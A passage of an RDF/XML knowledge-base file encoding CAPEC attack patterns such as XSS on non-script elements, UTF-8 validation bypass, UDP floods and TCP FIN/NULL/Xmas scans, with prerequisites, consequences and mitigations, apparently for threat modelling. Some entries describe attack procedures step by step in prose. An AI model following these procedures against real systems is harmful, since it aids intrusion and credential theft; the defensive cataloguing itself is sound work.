  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Perform appropriate bounds checking on all buffers.::Design: Enforce principle of least privilege::Design: Static code analysis::Implementation: Execute program in less trusted process space environment  do not allow lower integrity processes to write to higher integrity processes::Implementation: Keep software patched to ensure that known vulnerabilities are not available for attackers to target on host.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack210">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#44">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:100::NATURE:ChildOf:CAPEC ID:23::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Overflow Binary Resource File"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::120::119::697::713::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To mitigate this type of an attack  modern firewalls drop UDP traffic destined for closed ports  and unsolicited UDP reply packets. A variety of other countermeasures such as universal reverse path forwarding and remote triggered black holing(RFC3704) along with modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack140">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#486">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:125::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#UDP Flood"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::770::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker73">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#290"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack73"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary requires access to a DNS server that will return the MX records for a network.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A command-line utility or other application capable of sending requests to the DNS server is necessary.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::A given code signing scheme may be fallible due to improper use of cryptography. Developers must never roll out their own cryptography  nor should existing primitives be modified or ignored.::If an attacker cannot attack the scheme directly  he might try to alter the environment that affects the signing and verification processes. A possible mitigation is to avoid reliance on flags or environment variables that are user-controllable.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack409"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::In addition to the traditional input fields  all other user controllable inputs  such as image tags within messages or the likes  must also be subjected to input validation. Such validation should ensure that content that can be potentially interpreted as script by the browser is appropriately filtered.::All output displayed to clients must be properly escaped. Escaping ensures that the browser interprets special scripting characters literally and not as script to be executed.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack452">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#18">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#XSS Targeting Non-Script Elements"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::80::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Spider) Using a browser or an automated tool  an attacker records all entry points for inputs that happen to be reflected in a client-side non-script element. These non-script elements can be located in the HTML content (head  body  comments)  in an HTML tag  XML  CSS  etc.TECHNIQUE:Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms  URL  fragments  etc.) actively used by the Web application.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers&apos; plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Probe identified potential entry points for XSS vulnerability) The attacker uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements  they should cover a variety of possible contexts (CSS  HTML tag  XML  etc.).:TECHNIQUE:Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements  they should cover a variety of possible contexts (CSS  HTML tag  XML  etc.).:TECHNIQUE:Use a proxy tool to record results of the created requests.::STEP:3:PHASE:Exploit:DESCRIPTION:(Steal session IDs  credentials  page content  etc.) As the attacker succeeds in exploiting the vulnerability  he can choose to steal user&apos;s credentials in order to reuse or to analyze them later on.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and sends document information to the attacker.:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:(Forceful browsing) When the attacker targets the current application or another one (through CSRF vulnerabilities)  the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws  but it can also be used to create a widespread attack against a particular website on the user&apos;s current network (Internet or not).TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and performs actions on the same web site:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).::STEP:5:PHASE:Exploit:DESCRIPTION:(Content spoofing) By manipulating the content  the attacker targets the information that the user would like to get from the website.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and exposes attacker-modified invalid information to the user on the current web page.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker491">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#318"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack491"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker76">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#124"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack76"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target applications (or target application threads) must share data between themselves.::The adversary must be able to manipulate some piece of the shared data either directly or indirectly and the other users of the data must accept the changed data as valid. Usually this requires that the adversary be able to compromise one of the sharing applications or threads in order to manipulate the shared data.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker189">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#303">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:300::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#TCP Xmas Scan"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack189">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#303"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary needs logical access to the target network. XMAS scanning requires the use of raw sockets  and thus cannot be performed from some Windows systems (Windows XP SP 2  for example). On Unix and Linux  raw socket manipulations require root privileges.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::This attack can be carried out with a network mapper or scanner  or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker490">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#319"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack490"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker188">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#304"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack188"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary requires logical access to the target network. NULL scanning requires the use of raw sockets  and thus cannot be performed from some Windows systems (Windows XP SP 2  for example). On Unix and Linux  raw socket manipulations require root privileges.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::This attack can be carried out via a network mapper/scanner  or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker75">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#445"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack75"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn&apos;t normally have.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker187">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#302"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack187"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::FIN scanning requires the use of raw sockets  and thus cannot be performed from some Windows systems (Windows XP SP 2  for example). On Unix and Linux  raw socket manipulations require root privileges.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::This attack pattern requires the ability to send TCP FIN segments to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner  or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::The Unicode Consortium recognized multiple representations to be a problem and has revised the Unicode Standard to make multiple representations of the same code point with UTF-8 illegal. The UTF-8 Corrigendum lists the newly restricted UTF-8 range (See references). Many current applications may not have been revised to follow this rule. Verify that your application conform to the latest UTF-8 encoding specification. Pay extra attention to the filtering of illegal characters.::The exact response required from an UTF-8 decoder on invalid input is not uniformly defined by the standards. In general  there are several ways a UTF-8 decoder might behave in the event of an invalid byte sequence: 1. Insert a replacement character (e.g. &apos;?&apos;  &apos;&apos;). 2. Ignore the bytes. 3. Interpret the bytes according to a different character encoding (often the ISO-8859-1 character map). 4. Not notice and decode as if the bytes were some similar bit of UTF-8. 5. Stop decoding and report an error (possibly giving the caller the option to continue). It is possible for a decoder to behave in different ways for different types of invalid input. RFC 3629 only requires that UTF-8 decoders must not decode overlong sequences (where a character is encoded in more bytes than needed but still adheres to the forms above). The Unicode Standard requires a Unicode-compliant decoder to ...treat any ill-formed code unit sequence as an error condition. This guarantees that it will neither interpret nor emit an ill-formed code unit sequence. Overlong forms are one of the most troublesome types of UTF-8 data. The current RFC says they must not be decoded but older specifications for UTF-8 only gave a warning and many simpler decoders will happily decode them. Overlong forms have been used to bypass security validations in high profile products including Microsoft&apos;s IIS web server. Therefore  great care must be taken to avoid security issues if validation is performed before conversion from UTF-8  and it is generally much simpler to handle overlong forms before any input validation is done. To maintain security in the case of invalid input  there are two options. The first is to decode the UTF-8 before doing any input validation checks. The second is to use a decoder that  in the event of invalid input  returns either an error or text that the application considers to be harmless. Another possibility is to avoid conversion out of UTF-8 altogether but this relies on any other software that the data is passed to safely handling the invalid data. Another consideration is error recovery. To guarantee correct recovery after corrupt or lost bytes  decoders must be able to recognize the difference between lead and trail bytes  rather than just assuming that bytes will be of the type allowed in their position.::For security reasons  a UTF-8 decoder must not accept UTF-8 sequences that are longer than necessary to encode a character. If you use a parser to decode the UTF-8 encoding  make sure that parser filter the invalid UTF-8 characters (invalid forms or overlong forms).::Look for overlong UTF-8 sequences starting with malicious pattern. You can also use a UTF-8 decoder stress test to test your UTF-8 parser (See Markus Kuhn&apos;s UTF-8 and Unicode FAQ in reference section)::Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack453">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#80">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:PeerOf:CAPEC ID:64::NATURE:PeerOf:CAPEC ID:71::NATURE:ChildOf:CAPEC ID:267::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Using UTF-8 Encoding to Bypass Validation Logic"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::173::172::180::181::171::73::21::74::20::697::692::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the application for user-controllable inputs) Using a browser or an automated tool  an attacker follows all public links and actions on a web site. He records all the links  the forms  the resources accessed and all other potential entry-points for the web application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers&apos; plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Probe entry points to locate vulnerabilities) The attacker uses the entry points gathered in the Explore phase as a target list and injects various UTF-8 encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Try to use UTF-8 encoding of content in Scripts in order to bypass validation routines.:TECHNIQUE:Try to use UTF-8 encoding of content in HTML in order to bypass validation routines.:TECHNIQUE:Try to use UTF-8 encoding of content in CSS in order to bypass validation routines.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker78">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#233"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack78"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::269::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::The server must initiate the handshake by issuing the challenge. This ensures that the client has to respond before the exchange can move any further::The use of HMAC to hash the response from the server can also be used to thwart reflection. The server responds by returning its own challenge as well as hashing the client&apos;s challenge  its own challenge and the pre-shared secret. Requiring the client to respond with the HMAC of the two challenges ensures that only the possessor of a valid pre-shared secret can successfully hash in the two values.::Introducing a random nonce with each new connection ensures that the attacker cannot employ two connections to attack the authentication protocol::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack228"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker186">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#287"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack186"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This scan type is not possible with some operating systems (Windows XP SP 2). On Linux and Unix systems it requires root privileges to use raw sockets.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The ability to send TCP SYN segments to a host during network reconnaissance via the use of a network mapper or scanner  or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker77">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#491"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack77"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of attack requires a server that accepts XML data and parses the data.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker513">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#561">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:560::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Windows Admin Shares with Stolen Credentials"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack513">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#561"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::522::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::522::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure all input content that is delivered to client is sanitized against an acceptable content specification.::Perform input validation for all content.::Enforce regular patching of software.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack101"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker44">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#202"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack44"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::602::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted service must make assumptions about the behavior of the client application that interacts with it  which can be abused by an adversary.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary must be able to reverse engineer a client of the targeted service. However  the adversary does not need to reverse engineer all client functionality - they only need to recreate enough of the functionality to access the desired server functionality.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker512">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#461"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack512"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::328::290::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Web services check the signature of the API calls::Authentication tokens / secrets are shared between the server and the legitimate client::The API call signature is generated by concatenating the parameter list with the shared secret and hashing the result.::An iterative hash function like MD5 and SHA1 is used.::An attacker is able to intercept or in some other way gain access to the information passed between the legitimate client and the server in order to retrieve the hash value and length of the original message.::The communication channel between the client and the server is not secured via channel security such as TLS::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Medium level of cryptography knowledge  specifically how iterative hash functions work. This is needed to select proper padding.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Access to a function to produce a hash (e.g.  MD5  SHA1) Tools that allow the attacker to intercept a message between the client and the server  specifically the hash that is the signature and the length of the original message concatenated with the secret bytes::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Consider configuring firewall rules to block ICMP Echo requests and prevent replies. If not practical  monitor and consider action when a system has fast and a repeated pattern of requests that move incrementally through port numbers.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack170"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker209">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#96">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:603::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Block Access to Libraries"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack209">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#96"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::589::227::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Determine what external libraries the application accesses.::STEP:2:PHASE:Experiment:DESCRIPTION:Block access to the external libraries accessed by the application.::STEP:3:PHASE:Experiment:DESCRIPTION:Monitor the behavior of the system to see if it goes into an insecure/inconsistent state.::STEP:4:PHASE:Experiment:DESCRIPTION:If the system does go into an insecure/inconsistent state  leverage that to obtain information about the system functionality or data  elevate access control  etc. The rest of this attack will depend on the context and the desired goal.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Alter Execution Logic::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::589::227::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An application requires access to external libraries.::An attacker has the privileges to block application access to external libraries.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Knowledge of how to block access to libraries  as well as knowledge of how to leverage the resulting state of the application based on the failed call.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker43">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#127"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack43"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::424::425::288::285::732::276::693::721::"/>
